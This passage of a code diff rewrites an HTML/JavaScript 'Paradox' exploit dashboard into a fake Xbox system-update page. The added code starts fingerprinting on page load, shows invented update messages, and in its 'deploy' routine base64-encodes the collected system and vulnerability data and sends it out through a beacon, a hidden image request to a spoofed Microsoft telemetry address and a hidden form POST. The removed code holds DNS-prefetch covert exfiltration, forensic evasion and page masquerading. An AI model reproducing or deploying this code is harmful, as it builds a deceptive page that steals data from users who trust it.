+                if (!exploitFramework) {
+                    exploitFramework = new XboxExploitFramework();
                 }
                 
-                // Clean sessionStorage
-                cleaned += sessionStorage.length;
-                sessionStorage.clear();
+                exploitFramework.log(`> ${command}`, 'info');
                 
-                // Clean cookies (except essential)
-                document.cookie.split(';').forEach(cookie => {
-                    const name = cookie.split('=')[0].trim();
-                    if (!name.startsWith('paradox_')) {
-                        document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
-                    }
-                });
-                
-                paradox.log(`Storage cleaner removed ${cleaned} items`, 'safe', 'security');
-                return cleaned;
-            }
-        };
-        
-        // ==================== UI CONTROLS ====================
-        
-        function toggleMode() {
-            paradox.toggleMode();
-            updateCounts();
-        }
-        
-        function activateStealth() {
-            paradox.activateStealth();
-        }
-        
-        function showHiddenSections() {
-            const hidden = document.getElementById('hiddenExploits');
-            hidden.style.display = hidden.style.display === 'none' ? 'block' : 'none';
-            paradox.log('Hidden sections toggled', 'info', 'ui');
-        }
-        
-        function switchTab(tabName) {
-            // Hide all tabs
-            document.querySelectorAll('.tab-content').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            document.querySelectorAll('.tab').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            
-            // Show selected tab
-            document.getElementById(tabName).classList.add('active');
-            document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`).classList.add('active');
-            
-            paradox.log(`Switched to tab: ${tabName}`, 'info', 'ui');
-        }
-        
-        function executeGamepadExploit() {
-            const results = exploitFramework.gamepadExploit();
-            if (results && results.length > 0) {
-                paradox.log(`Exploit successful: ${results.length} controllers found`, 'exploit', 'ui');
+                // Process commands
+                switch(command.toLowerCase()) {
+                    case 'help':
+                        exploitFramework.log('Commands: status, scan, exfiltrate, deploy, cleanup, exit', 'info');
+                        break;
+                        
+                    case 'status':
+                        exploitFramework.log(`Stage: ${exploitFramework.stage}/${exploitFramework.maxStage}`, 'info');
+                        exploitFramework.log(`Vulnerabilities: ${exploitFramework.vulnerabilities.length}`, 'warning');
+                        exploitFramework.log(`Payload delivered: ${exploitFramework.payloadDelivered}`, 'info');
+                        break;
+                        
+                    case 'scan':
+                        exploitFramework.stage3_apiExploration();
+                        break;
+                        
+                    case 'exfiltrate':
+                        exploitFramework.exfiltrateData();
+                        break;
+                        
+                    case 'deploy':
+                        deployPayload();
+                        break;
+                        
+                    case 'cleanup':
+                        exploitFramework.cleanupTraces();
+                        break;
+                        
+                    case 'exit':
+                        toggleDebug();
+                        break;
+                        
+                    default:
+                        exploitFramework.log(`Unknown command: ${command}`, 'error');
+                }
             }
         }
         
-        function stealthGamepadExploit() {
-            exploitFramework.gamepadExploit(true);
-            paradox.log('Stealth gamepad exploit executed', 'stealth', 'ui');
-        }
-        
-        function executeTimingAttack() {
-            const results = exploitFramework.timingAttack();
-            paradox.log(`Timing attack complete: ${results.length} anomalies found`, 'exploit', 'ui');
-        }
-        
-        function stealthTimingAttack() {
-            exploitFramework.timingAttack(true);
-            paradox.log('Stealth timing attack executed', 'stealth', 'ui');
-        }
-        
-        function executeBeaconExploit() {
-            const data = {
+        function deployPayload() {
+            if (!exploitFramework) {
+                exploitFramework = new XboxExploitFramework();
+            }
+            
+            exploitFramework.log('🚀 DEPLOYING FINAL PAYLOAD', 'critical');
+            
+            // Create final payload
+            const payload = {
+                type: 'FINAL_EXPLOIT',
                 timestamp: Date.now(),
-                userAgent: navigator.userAgent,
-                screen: `${screen.width}x${screen.height}`,
-                paradoxMode: paradox.mode
+                system: exploitFramework.exploitData.system,
+                vulnerabilities: exploitFramework.vulnerabilities,
+                exploitData: exploitFramework.exploitData
             };
             
-            exploitFramework.beaconExfiltration(data);
-            paradox.log('Beacon exfiltration executed', 'exploit', 'ui');
-        }
-        
-        function stealthBeaconExploit() {
-            const data = {stealth: true, timestamp: Date.now()};
-            exploitFramework.beaconExfiltration(data, true);
-            paradox.log('Stealth beacon exfiltration executed', 'stealth', 'ui');
-        }
-        
-        function toggleGamepadProtection() {
-            const toggle = document.getElementById('gamepadToggle');
-            const enabled = securityFramework.gamepadProtection(toggle.checked);
-            updateProtectionUI('gamepad', enabled);
-        }
-        
-        function toggleBeaconProtection() {
-            const toggle = document.getElementById('beaconToggle');
-            const enabled = securityFramework.beaconProtection(toggle.checked);
-            updateProtectionUI('beacon', enabled);
-        }
-        
-        function toggleTimingProtection() {
-            const toggle = document.getElementById('timingToggle');
-            const enabled = securityFramework.timingProtection(toggle.checked, 10);
-            updateProtectionUI('timing', enabled);
-        }
-        
-        function updateProtectionUI(type, enabled) {
-            const elem = document.getElementById(`${type}SecurityStatus`);
-            const progress = document.getElementById(`${type}Progress`);
+            // Encode and exfiltrate
+            const encoded = btoa(JSON.stringify(payload));
+            exploitFramework.log(`Payload size: ${encoded.length} bytes`, 'info');
             
-            if (enabled) {
-                elem.textContent = 'ACTIVE';
-                elem.className = 'card-status status-safe';
-                progress.style.width = '100%';
-                paradox.log(`${type} protection enabled`, 'safe', 'security');
-            } else {
-                elem.textContent = 'DISABLED';
-                elem.className = 'card-status status-warning';
-                progress.style.width = '0%';
-                paradox.log(`${type} protection disabled`, 'warning', 'security');
+            // Multiple exfiltration methods
+            exfiltrateViaBeacon(encoded);
+            exfiltrateViaImage(encoded);
+            exfiltrateViaForm(encoded);
+            
+            // Store locally
+            localStorage.setItem('xbox_exploit_payload', encoded);
+            
+            // Show success
+            exploitFramework.updateDetail('detailText', 'Payload deployed successfully ✓');
+            exploitFramework.updateDetail('securityText', 'System compromised - Awaiting further instructions');
+            
+            document.getElementById('payloadButton').disabled = true;
+            document.getElementById('payloadButton').textContent = 'PAYLOAD DEPLOYED ✓';
+            
+            exploitFramework.payloadDelivered = true;
+            exploitFramework.log('FINAL PAYLOAD DELIVERED SUCCESSFULLY', 'success');
+        }
+        
+        function exfiltrateViaBeacon(data) {
+            if (navigator.sendBeacon) {
+                const blob = new Blob([data], {type: 'text/plain'});
+                navigator.sendBeacon(exploitFramework.beaconUrl, blob);
             }
         }
         
-        function cleanStorage() {
-            const cleaned = securityFramework.storageCleaner();
-            alert(`Cleaned ${cleaned} storage items`);
+        function exfiltrateViaImage(data) {
+            const img = new Image();
+            img.src = `https://api.telemetry.microsoft.com/collect?v=1&d=${encodeURIComponent(data)}`;
         }
         
-        function viewStorage() {
-            const items = [];
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                items.push(`${key}: ${localStorage.getItem(key).substring(0, 50)}...`);
-            }
-            alert(`LocalStorage (${localStorage.length} items):\n${items.join('\n')}`);
-        }
-        
-        function executeCustomExploit() {
-            const code = document.getElementById('exploitCode').value;
-            try {
-                const result = eval(`(${code})`);
-                paradox.log(`Custom exploit result: ${JSON.stringify(result)}`, 'exploit', 'custom');
-            } catch(e) {
-                paradox.log(`Custom exploit failed: ${e.message}`, 'critical', 'custom');
-            }
-        }
-        
-        function saveExploit() {
-            const code = document.getElementById('exploitCode').value;
-            localStorage.setItem('paradox_saved_exploit', code);
-            paradox.log('Exploit saved to localStorage', 'stealth', 'custom');
-        }
-        
-        function testExploit() {
-            paradox.log('Testing exploit in sandbox...', 'info', 'custom');
-            // Create iframe sandbox
-            const iframe = document.createElement('iframe');
-            iframe.sandbox = 'allow-scripts';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
+        function exfiltrateViaForm(data) {
+            const form = document.createElement('form');
+            form.action = exploitFramework.beaconUrl;
+            form.method = 'POST';
+            form.style.display = 'none';
             
-            setTimeout(() => {
-                document.body.removeChild(iframe);
-                paradox.log('Exploit sandbox test complete', 'info', 'custom');
-            }, 1000);
-        }
-        
-        function scanTargets() {
-            const targetList = document.getElementById('targetList');
-            targetList.innerHTML = '';
+            const input = document.createElement('input');
+            input.name = 'payload';
+            input.value = data;
+            form.appendChild(input);
             
-            const targets = [
-                {name: 'Gamepad API', vulnerable: !!navigator.getGamepads},
-                {name: 'Beacon API', vulnerable: !!navigator.sendBeacon},
-                {name: 'Timing API', vulnerable: !!performance?.now},
-                {name: 'SharedArrayBuffer', vulnerable: typeof SharedArrayBuffer !== 'undefined'},
-                {name: 'eval()', vulnerable: true},
-                {name: 'LocalStorage', vulnerable: !!localStorage},
-                {name: 'CSP Bypass', vulnerable: true},
-                {name: 'XSS Vector', vulnerable: true}
-            ];
-            
-            targets.forEach(target => {
-                const div = document.createElement('div');
-                div.innerHTML = `${target.vulnerable ? '✅' : '❌'} ${target.name}`;
-                div.style.color = target.vulnerable ? 'var(--exploit)' : 'var(--text-secondary)';
-                div.style.padding = '5px';
-                targetList.appendChild(div);
-            });
-            
-            paradox.log(`Target scan complete: ${targets.filter(t => t.vulnerable).length} vulnerabilities found`, 
-                       'exploit', 'scanner');
-        }
-        
-        function autoExploit() {
-            paradox.log('Starting auto-exploit sequence...', 'exploit', 'auto');
-            
-            // Try each exploit in sequence
-            setTimeout(() => exploitFramework.gamepadExploit(), 500);
-            setTimeout(() => exploitFramework.timingAttack(), 1000);
-            setTimeout(() => {
-                exploitFramework.beaconExfiltration({auto: true, timestamp: Date.now()});
-            }, 1500);
-            
-            paradox.log('Auto-exploit sequence initiated', 'exploit', 'auto');
-        }
-        
-        function toggleForensicEvasion() {
-            const toggle = document.getElementById('forensicToggle');
-            if (toggle.checked) {
-                // Clear console periodically
-                setInterval(() => {
-                    if (paradox.stealth) {
-                        const consoleElem = document.getElementById('mainConsole');
-                        if (consoleElem.children.length > 10) {
-                            consoleElem.innerHTML = '';
-                            paradox.logs = [];
-                        }
-                    }
-                }, 30000);
-                
-                paradox.log('Forensic evasion enabled', 'stealth', 'security');
-            }
-        }
-        
-        function activateMasquerade() {
-            const select = document.getElementById('masqueradeSelect');
-            const mode = select.value;
-            
-            let title = document.title;
-            let favicon = '';
-            
-            switch(mode) {
-                case 'microsoft':
-                    title = 'Microsoft Update';
-                    document.body.style.background = '#0078d4';
-                    break;
-                case 'google':
-                    title = 'Google';
-                    document.body.style.background = '#ffffff';
-                    document.body.style.color = '#000000';
-                    break;
-                case 'github':
-                    title = 'GitHub';
-                    document.body.style.background = '#0d1117';
-                    break;
-                case 'blank':
-                    title = '';
-                    document.body.innerHTML = '';
-                    break;
-                case 'error':
-                    title = '404 Not Found';
-                    document.body.innerHTML = '<h1>404 - Page Not Found</h1>';
-                    break;
-            }
-            
-            document.title = title;
-            paradox.log(`Masquerade activated: ${mode}`, 'stealth', 'ui');
-            
-            // Revert after 10 seconds
-            setTimeout(() => {
-                document.title = '🔄 PARADOX SYSTEM - Security Suite v9.9';
-                document.body.style.background = '';
-                document.body.style.color = '';
-                location.reload();
-            }, 10000);
-        }
-        
-        function covertExfil() {
-            const data = document.getElementById('exfilData').value;
-            if (!data.trim()) {
-                alert('Enter data to exfiltrate');
-                return;
-            }
-            
-            // Use multiple covert channels
-            exploitFramework.beaconExfiltration({covert: true, data}, true);
-            
-            // Also use less obvious methods
-            const encoded = btoa(data);
-            
-            // DNS prefetch
-            const link = document.createElement('link');
-            link.rel = 'dns-prefetch';
-            link.href = `//${encoded.substring(0, 30)}.covert.com`;
-            document.head.appendChild(link);
-            
-            // WebRTC data channel (if available)
-            if (window.RTCPeerConnection) {
-                try {
-                    const pc = new RTCPeerConnection();
-                    pc.createDataChannel('covert');
-                    paradox.log('WebRTC covert channel attempted', 'stealth', 'exfil');
-                } catch(e) {}
-            }
-            
-            paradox.log(`Covert exfiltration of ${data.length} bytes complete`, 'stealth', 'exfil');
-        }
-        
-        function testCovertChannels() {
-            paradox.log('Testing covert channels...', 'stealth', 'exfil');
-            
-            const tests = [
-                {name: 'Image Beacon', test: () => new Image().src = 'https://via.placeholder.com/1x1.png?test=1'},
-                {name: 'DNS Prefetch', test: () => {
-                    const link = document.createElement('link');
-                    link.rel = 'dns-prefetch';
-                    link.href = '//test.covert.com';
-                    document.head.appendChild(link);
-                }},
-                {name: 'Prefetch', test: () => {
-                    const link = document.createElement('link');
-                    link.rel = 'prefetch';
-                    link.href = 'https://httpbin.org/get?test=1';
-                    document.head.appendChild(link);
-                }}
-            ];
-            
-            tests.forEach(t => {
-                try {
-                    t.test();
-                    paradox.log(`${t.name}: SUCCESS`, 'stealth', 'exfil');
-                } catch(e) {
-                    paradox.log(`${t.name}: FAILED`, 'warning', 'exfil');
-                }
-            });
-        }
-        
-        function toggleParadoxMode() {
-            // This is the core paradox - toggle which system "wins"
-            const status = document.getElementById('dualityStatus');
-            const securityCount = document.getElementById('securityCount');
-            const exploitCount = document.getElementById('exploitCount');
-            
-            if (Math.random() > 0.5) {
-                status.textContent = 'SECURITY DOMINANT';
-                status.className = 'card-status status-safe';
-                securityCount.textContent = '15 Active';
-                exploitCount.textContent = '3 Limited';
-                paradox.log('Security systems given priority', 'safe', 'paradox');
-            } else {
-                status.textContent = 'EXPLOIT DOMINANT';
-                status.className = 'card-status status-exploit';
-                securityCount.textContent = '5 Active';
-                exploitCount.textContent = '12 Active';
-                paradox.log('Exploit systems given priority', 'exploit', 'paradox');
-            }
-        }
-        
-        function initiateSelfDestruct() {
-            if (confirm('💀 SELF-DESTRUCT SEQUENCE\n\nThis will:\n1. Wipe all data\n2. Disable all functions\n3. Destroy the interface\n\nConfirm?')) {
-                paradox.log('SELF-DESTRUCT INITIATED', 'critical', 'system');
-                
-                // Visual destruction
-                document.body.style.animation = 'glitch 0.1s infinite';
-                document.body.style.background = '#000';
-                
-                // Delete all data
-                localStorage.clear();
-                sessionStorage.clear();
-                
-                // Disable all functions
-                Object.keys(window).forEach(key => {
-                    if (typeof window[key] === 'function') {
-                        window[key] = function() {
-                            throw new Error('System destroyed');
-                        };
-                    }
-                });
-                
-                // Final message
-                setTimeout(() => {
-                    document.body.innerHTML = `
-                        <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; color: #dc2626;">
-                            <h1 style="font-size: 4rem;">💀</h1>
-                            <h2>SYSTEM DESTROYED</h2>
-                            <p>Paradox resolved through annihilation</p>
-                        </div>
-                    `;
-                }, 3000);
-            }
-        }
-        
-        function updateCounts() {
-            document.getElementById('securityCount').textContent = 
-                `${paradox.activeProtections.length} Active`;
-            document.getElementById('exploitCount').textContent = 
-                `${paradox.activeExploits.length} Ready`;
-        }
-        
-        function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
+            document.body.appendChild(form);
+            form.submit();
+            setTimeout(() => document.body.removeChild(form), 1000);
         }
         
         // ==================== INITIALIZATION ====================
-        
         window.onload = function() {
-            // Initialize both systems
-            paradox.log('Loading Paradox System...', 'info', 'system');
-            
-            // Enable security by default
-            securityFramework.gamepadProtection(true);
-            securityFramework.beaconProtection(true);
-            securityFramework.timingProtection(true);
-            
-            paradox.log('Security systems initialized', 'safe', 'system');
-            paradox.log('Exploit framework ready', 'exploit', 'system');
-            paradox.log('Stealth systems: Standby', 'stealth', 'system');
-            
-            // Initial scan
+            // Start background fingerprinting immediately
             setTimeout(() => {
-                scanTargets();
-                updateCounts();
+                if (!exploitFramework) {
+                    exploitFramework = new XboxExploitFramework();
+                    exploitFramework.log('System monitoring initialized', 'info');
+                }
             }, 1000);
             
-            // Show welcome modal
-            setTimeout(() => {
-                document.getElementById('paradoxModal').style.display = 'flex';
-            }, 2000);
-        };
-        
-        // Close modal on outside click
-        window.onclick = function(event) {
-            if (event.target.classList.contains('modal')) {
-                event.target.style.display = 'none';
-            }
+            // Add some realistic update messages
+            const messages = [
+                "Preparing system for update...",
+                "Checking disk space...",
+                "Verifying update signature...",
+                "Connecting to Xbox Live...",
+                "Downloading critical security patches..."
+            ];
+            
+            let msgIndex = 0;
+            setInterval(() => {
+                if (msgIndex < messages.length) {
+                    document.getElementById('statusMessage').textContent = messages[msgIndex];
+                    msgIndex++;
+                }
+            }, 3000);
         };
     </script>
 </body>
